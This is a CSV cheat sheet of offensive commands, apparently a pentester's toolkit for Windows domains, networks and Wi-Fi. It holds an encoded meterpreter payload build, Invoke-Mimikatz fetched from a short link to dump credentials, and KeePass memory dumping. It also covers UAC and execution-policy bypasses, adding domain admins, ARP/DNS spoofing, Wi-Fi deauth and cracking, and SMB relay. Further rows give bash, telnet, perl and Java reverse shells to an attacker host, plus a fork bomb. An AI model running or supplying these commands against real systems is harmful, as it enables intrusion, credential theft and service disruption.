CommandID,Command,Comment,Program
89,msfvenom -p windows/meterpreter/reverse_https -f dll -e x86/shikata_ga_nai -i 30 LHOST=[IP] LPORT=443 > /data/Clients/[FILE],MSF Venom make dll,MSFVenom
90,runas /user:[DOM]\[USER] [EXE],Windows run as,Powershell
91,"accesschk.exe -uwcqv ""Authenticated Users"" *","Priv esc check weak service perms, you may need an older version for older windows!",Accesschk
92,Set-ExecutionPolicy unrestricted,powershell bypass block,Powershell
93,powershell.exe -noprofile -executionpolicy bypass,powershell bypass block,Powershell
94,"for host in $(cat ../nmap/[IP File]); do echo ""Trying $host""; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done",loop to find user shares,Bash
95,"powershell ""IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds""","Invoke mimicatz, can use with psexec for pwnage",Powershell
96,procdump.exe -accepteula -ma keepass.exe keepass.dmp,Dump a processes memory for offline abuse,ProcDump
97,setenforce permissive,"kill puppies, you monster (disable SElinux, though seriously just work around it)",
98,"for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host 'WMIC ComputerSystem Get UserName'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v ""^\["" | grep -v ""^Impacket"" | grep -v ""^Trying"" | grep -v ""SMB SessionError"" | sed '/^$/d'",loop for who is where,Psexec
99,"Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv","Powershell password last changed, run on DC",Powershell
100,dnscmd 127.0.0.1 /ZoneExport [FQDN] [OUT].zone,dump dns zone on DC,
101,"mount -t cifs \\\\[victim]\\SYSVOL -o username=[user],password=[password] mount/; nautilus mount/;",Mount Sysvol share (hosted on the DC),
102,"egrep -r ""cpassword|net"" mount",Look in 'mount' for share (mount sysvol first),
103,"for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host ""ipconfig""; done | grep ""IPv4 Address\|Ethernet adapter\|^[0-9]"" | sed '/^$/d' | tee dualhomed-search.txt",loop to look for dual homed hosts,Psexec
104,for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information,loop to find local admins,Psexec
105,"egrep -v ""(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)"" local_admin_information | egrep -v ""(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)"" | grep -v ""Alias name"" | grep -v ""Administrators have complete"" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v ""^$"" | sed s/""\[\*\] Creating service.*on""/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/""^ ""/""€""/g | sed s/'The command completed successfully.'/€/g | tr ""\n"" "","" | tr € ""\n"" | grep -v ""^$"" | sort | uniq  > local_admins.csv",turn loop for local admins into csv,
106,"tsql -S [IP] -U sa -P""[PASS]""",connect to mssql,
107,impacket-mssqlclient [user]:[pass]@[ip] -port [port],connect to mssql,Mssqlclient
108,"c:\windows\system32\inetsrv\appcmd.exe list apppool ""SharePoint Central Administration v4"" /text:ProcessModel.Password",Recover IIS password,Cmd
109,netdom query trust,get domain trusts,
110,netsh interface portproxy show all,show native port forwards windows,Netsh
111,netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip],set native port forward windows,Netsh
112,netsh interface portproxy reset,reset native port forward windows,Netsh
113,"sc query ""MpsSvc""",windows firewall status,
114,netsh advfirewall firewall,windows firewall status,Netsh
115,tasklist /v,Windows process list,
116,taskkill /f /im [PROCESS],Windows force kill process,
117,"netstat -a | find ""LISTENING""",Windows list listening ports,
118,"tasklist /FI ""IMAGENAME eq [process].exe"" /V",Windows open files,
119,bypassuac.exe /c [COMMAND],ByPassUAC,
120,at [TIME] command.exe /s cmd SYSCMD,Scheduled cmd to run,
121,"for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host ""cmd.exe""; done","loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec",
122,"psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] ""cmd.exe""",PSExec with hashses,Psexec
123,"rpcclient -U '[DOMAIN]\[USER]'%'[PASS]' '[TARGET]' -c enumdomusers,enumdomgroups",RPCClient smb show users and groups,
124,name=sslfile;openssl genrsa -out $name.key 2048;openssl req -new -key $name.key -out $name.csr; openssl x509 -req -days 10 -in $name.csr -signkey $name.key -out $name.crt;openssl pkcs12 -export -clcerts -in $name.crt -inkey $name.key -out $name.p12;openssl pkcs12 -in $name.p12 -out $name.pem -clcerts,Create Self-signed cert / key,
125,"wmic service get name,displayname,pathname,startmode",Unquoted Service Paths,
126,sc query,Unquoted Service Paths,
127,"sc qc ""[SERVICE]""",Unquoted Service Paths,
128,"sc config ""[SERVICE]"" start= auto","Unquoted Service Paths, start service",
129,"sc config ""[SERVICE]"" start= disabled",Unquoted Service Paths,
130,"Sub Test();Shell (""powershell"");End Sub",VBA launching command,
131,"echo var WinHttpReq = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");WinHttpReq.Open(""GET"",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject(""ADODB.Stream"");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(""out.exe"");>wget.js",Javascript wget windows oneline : cscript /nologo wget.js http://[IP],
132,netsh wlan show profile,Windows Wireless,
133,"netsh wlan show profile name=""[SSID]"" key=clear",Windows Wireless,
134,"for host in $(cat localsubnet.txt); do echo ""Trying $host""; winexe --user [Domain]/[user]%[pass] //$host ""netsh wlan export profile name=[PROFILE] key=clear""; done",loop dump wifi keys,
135,run autoroute -s [CIDR SUBNET],proxy Metasploit pivot,MSFConsole
136,run autoroute -p,proxy metasploit pivot,MSFConsole
137,background it then run...,proxy Metasploit pivot,MSFConsole
138,use auxiliary/server/socks4a,proxy Metasploit pivot,MSFConsole
139,proxychains cmd,proxy pivot,Proxychains
140,type [FILE],Cat for windows,Cmd
141,"net group ""Domain Admins"" /domain",Domain Admins windows,Cmd
142,theHarvester.py -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt,harvester,TheHarvester
143,/data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt,harvester linkedin,TheHarvester
144,wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx,KeePass2 Cracking,
145,find / -iname '[SEARCH TERM]' 2>/dev/null,Find files,Shell
146,/opt/nessus/bin/nessuscmd -U -O -p[port] -V -i [plugin ID] [target IP],Single Nessus Module,Nessus
147,openssl s_client -connect [domain]:443,'Telnet' s_client to SSL,
148,ike-scan -A -v -id=test -f [input file] -P[PSK output file],IKE Agressive,IKE-Scan
149,psk-crack -d [word list e.g. rockyou.txt] [input key file],IKE Agressive,PSK-Crack
150,ipconfig /displaydns,Windows ARP Cache,Shell
151,use multi/handler,MSFConsoles for catching reverse shells,MSFConsole
152,set PAYLOAD <OS>/meterpreter/reverse_https,MSFConsole hints,MSFConsole
153,options,List options of payload,MSFConsole
154,set <variable> <value>,Set variable in MSFConsole,MSFConsole
155,set ExitOnSession false,MSFConsole hints,MSFConsole
156,exploit -j,Start exploit in jobs,MSFConsole
157,net user [user] [pass] /add /domain,Add a domain user from the CLI,Cmd
158,"net group ""Domain Admins"" [user] /add /domain",Add [User] to the domain admins group,Cmd
159,"net group ""Enterprise Admins"" [user] /add /domain",Add user to enterprise admins,Cmd
160,"net localgroup ""Remote Desktop Users"" [user] /add /domain",Add user to the RDP group,Cmd
161,"net localgroup ""Administrators"" [user] /add /domain","Add a user to the local admin group, not as useful any more",Cmd
162,sqlmap --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o -r sql1.txt,SQLmap generic command,SQLMap
163,etterfilter *.filter -o smb.ef,ARP Spoofing filter,
164,ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// ////,ARP Spoofing gateway,
165,ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//,ARP Spoofing everything,
166,ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//,ARP Spoofing DNS,
167,ipcalc -b [CIDR Subnet],Subnet calculator,
168,tcpdump -n -i [interface],TCPDump (no DNS resolution),
169,arping -I em1 [TARGET IP],ARPing,
170,for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt,ARPing sweep network,
171,ifconfig eth0 192.168.0.x/24,Temporary IP,Cmd
172,airmon-ng start wlan1,Wireless survey WIFI,
173,ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0,"Wireless survey WIFI, useful if airmon start is broke",
174,airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon,WIFI WPA handshake capture,
175,wpaclean [OUTPUT] [INPUT],WIFI WPA handshake prep,
176,aircrack-ng [INPUT.cap] -J [OUTPUT],WIFI WPA handshake prep,
177,airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0,wep crack : 1) start capturing IV's,
178,aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0,wep crack 2) De auth clients,
179,aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h [OurMac] wlan0,wep crack 3) Create a fake auth to the AP,
180,aireplay-ng -3 -b [VICTIM MAC] -h [OurMac] wlan0,wep cracking,
181,aircrack-ng -b [VICTIM MAC] [OUTPUT]*cap,wep cracking,
182,iptables -I OUTPUT -d [DST IP] -j DROP,Block outbound rule,
183,iptables -I INPUT -p tcp --destination-port [PORT] -j ACCEPT,Accept inbound port rule,
184,medusa -M ssh -U userlist -P passwordlist -h [host],medusa brute force,Medusa
185,./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3,Word list generator,
186,/data/hacking/hashcat-0.49/hashcat-cli64.bin -m 99999 wordseed.dic -r /data/hacking/hashcat-0.49/rules/leetspeak.rule --stdout | sort -u > custom.dic,Word list generator,
187,ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt,brute force ncrack vnc,
188,dig -t AXFR [FQDN] @[SERVER IP],DNS zone transfer,
189,nbtscan -v -s : 192.168.0.0/24 >> nbtscan-[SUBNET].txt,NBTScan,
190,for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done,NBTScan en masse,
191,"for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v ""name server""; done >> networks.txt",network discovery RDNS,
192,"cat networks-dirty.txt | grep ""^[0-9]"" | awk {'print $1'} | awk -F ""."" {'print $3"".""$2"".""$1"".0/24""'} | sort -u > nets.txt",network discovery RDNS,Shell
193,nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP,network discovery RDNS,Nmap
194,"cat nmapScan-ARP.gnmap | grep ""Status: Up"" | awk {'print $2'} | awk -F ""."" {'print $1"".""$2"".""$3"".0/24""'} | sort -u > networks-withlivehosts.txt",network discovery RDNS,Shell
195,python -m SimpleHTTPServer [PORT],instant web server,
196,smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe],smbrelay targeted,
197,smbrelayx.py -e [PAYLOAD exe],smbrelay reflection : note read into http -> smb refelction,
198,/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP],responder NBNS LLMNR,
199,smbclient -L [TARGET] -U [DOM]/[USER]%'[PASS]',"List smb shares on a target host domain and pass are optional, % seperates user from pass",SMBClient
200,"strings [FILENAME] --bytes=2 |grep ""^sa$"" -A 4",text in binaries,
201,telnet [IP] 25,Telnet Mail,
202,HELO [FQDN of your RDNS],Telnet Mail,
203,MAIL FROM: [SENDER ADDRESS],Telnet Mail,
204,RCPT TO: [RECIPIENT ADDRESS],Telnet Mail,
205,DATA,Telnet Mail,
206,Subject: [SUBJECT],Telnet Mail,
207,Date: [DATE],Telnet Mail,
208,From: [REAL NAME] <[EMAIL]>,Telnet Mail,
209,To: [REAL NAME] <[EMAIL]>,Telnet Mail,
210,[MESSAGE],Telnet Mail,
211,. (don't forget the full stop),Telnet Mail,
212,halberd -v -p 10 [URL],load balance detection,
213,enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum,Get a listing of all users and groups for targeting your post exploitation,
214,"cat [CLIENTNAME].domainenum | grep ""^user"" | cut -d "":"" -f 2 | cut -d ""]"" -f 1 | cut -d ""["" -f 2 > userlist.txt",Get a list of all the users in the domain from a full dump,
215,frogger.sh,Check for vlans that you can hop to : may need to change the grep for interfaces,
216,vconfig add em1 [VLANID],manual vlans,
217,dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1,dhcp client,Shell
218,cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`,dhcp lease rpm,Shell
219,cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`,dhcp lease deb,Shell
220,ls -lt /var/lib/NetworkManager/,dhcp lease,Shell
221,route add -net [CIDR] gw [IP] [INTERFACE],route table add,
222,route del -net 0.0.0.0 gw [GW] eth1,route table del,
223,7z a -p -mem=AES report.zip [INPUT FILE],Encrypted zip,
224,./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc],hashcat cpu,Hashcat
225,hc --gpu-temp-abort=100 --remove -m5500 netntlmv1.hash -a3 -1 '?u?l?d' '?1?1?1?1?1?1?1?1' -o hash.crack,hashcat assuming that hc is an alias (kraken | pablo),
226,500  MD5 Crypt $1 | 7400 SHA256 Crypt $5 | 1800 Sha512 Crypt $6,hashcat types,Hashcat
227,1000 NTLM | 3000 LM,hashcat types,Hashcat
228,1100 MScashv1 | 2100 MScashv2 (802.1X),hashcat types,Hashcat
229,2500 WPA/WPA2,hashcat types,Hashcat
230,5600 NetNTLMv2 | 5500 NetNTLMv1 | 5400 = IKE-PSK SHA1 | 5300 = IKE-PSK MD5 |,hashcat types,Hashcat
231,cvs checkout [package name],cvs check out repo,Cvs
232,cvs update -d .,cvs update local repo,Cvs
233,"cvs commit -m ""[Comment]"" [File inc ""package""]",cvs comit change with message,Cvs
234,"cvs add [File inc ""package""]",cvs add a new file,Cvs
235,cvs release [package or file in package],cvs delete file,Cvs
236,for a in $(cat ../nmap/IPs-HTTPS.txt); do sslscan $a; done | tee sslscan-[NET].txt,"sslscan, you will want to git clone and make static if your in kali",SSLScan
237,openssl s_client -connect victim.com:443 (this shows the chain),sslscan cert checks,
238,"openssl s_client -showcerts -connect victim.com:443 2>/dev/null | awk '$0==""-----BEGIN CERTIFICATE-----"" {p=1}; p; $0==""-----END CERTIFICATE-----"" {p=0}' (this pulls just the certificates for each in the chain)",sslscan cert checks,
239,"openssl x509 -noout -text | grep -i ""signature algorithm\|before\|after\|issuer\|subject:"" (split the above commands output and stick in here, then manually analyse)",sslscan cert checks,
240,genpasswd [CHAR LENGTH],Password Generator,
241,iodine -P [pass] [server],dns tunneling,
242,nmap -sS -Pn --open -T5 -p- [portspoofip] | tee nmap-tcp-outbound.txt,nmap outbound tcp,Nmap
243,nmap -Pn --open -T5 -sU -p- [portspoofip]| tee nmap-udp-outbound.txt,nmap outbound upd,Nmap
244,nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning,nmap smb signing,Nmap
245,nmap -sS -n -v -T4 -P0 -p- -oA nmap-tcp-scan -iL subnets.txt,nmap devicemap all tcp,Nmap
246,nmap -sU -n -v -T4 -P0 --top-ports 1000 -oA nmap-udp-scan -iL subnets.txt,nmap devicemap top 1000 udp,Nmap
247,"grep ""Discovered open port"" nmap-udp-scan.txt | sed ""s/\// /g"" | sed ""s/ /\t/g"" | awk -F ""\t"" {'print $7""\t""$5""\t""$4""\topen""'} > devicemap-udp.tsv",nmap devicemap,Nmap
248,"for file in $( ls -lash | grep "".gnmap"" | awk {'print $10'} ); do cat $file | grep ""Ports"" | grep ""open"" | awk {'print $2'} | sort -u > IPs-`echo $file | cut -d ""-"" -f 2 | cut -d ""."" -f 1;`.txt; done",nmap service discovery,Nmap
249,"cat nmapScan-[SERVICE].gnmap | grep ""Ports"" | grep ""open"" | grep -v ""open|filtered"" | awk {'print $2'} | sort -u > IPs-[SERVICE].txt",nmap service discovery,Nmap
250,"cat users | awk '{print substr ($0, 1, 1),$2}' | tr [A-Z] [a-z] | sort | uniq","Convert a user list in format ""first last"" to flast",Shell
251,exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done,bash reverse shell using a file handle '5',Bash
252,rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p,telnet reverse shell,
253,telnet [me] [port]| /bin/bash | telnet [me] [lport],telnet reverse shell,
254,"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,""[me]:80"");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",perl windows reverse shell,
255,"r = Runtime.getRuntime(); p = r.exec([""/bin/bash"",""-c"",""exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done""] as String[]); p.waitFor()",Java reverse shell - replace ; with newline,
256,"nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192,6992,16993,16994,16995,623,664 -v -n",Take a screenshot of a HTTP service,Nmap
257,modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0,moount VDI disk image,
258,losetup /dev/loop0 [file]; kpartx -a /dev/loop0; vgscan; vgchange -ay changethishostname-vg; mount /dev/changethishostname-vg/root mnt/,Mount LVM filesytem / image,
259,"printf ""%s"" $i | ecryptfs-unwrap-passphrase .ecryptfs/victim/.ecryptfs/wrapped-passphrase -; ecryptfs-add-passphrase -fnek; mount -t ecryptfs .ecryptfs/victim/.Private/ test/",Ecrypt FS mounting,
260,"cat DC_dump.txt | awk -F : '{print $1"":""$4}' | sort -k 2 -t : > sorted_hash; cat ntlm_cracked | sort -k 1 > sorted_cracked; join -t : -1 2 sorted_hash -2 1 sorted_cracked  >> pass_info",create medusa or hydra password list from cracked hashes,
261,netstat -tulpen,list network connections,
262,ip xfrm state list,print vpn keys,
263,echo 1 > /proc/sys/net/ipv4/ip_forward,enable ip forwarding in the kernel temporarily,
264,:(){:|:&;:,Fork Bomb : CRASH SYSTEM,
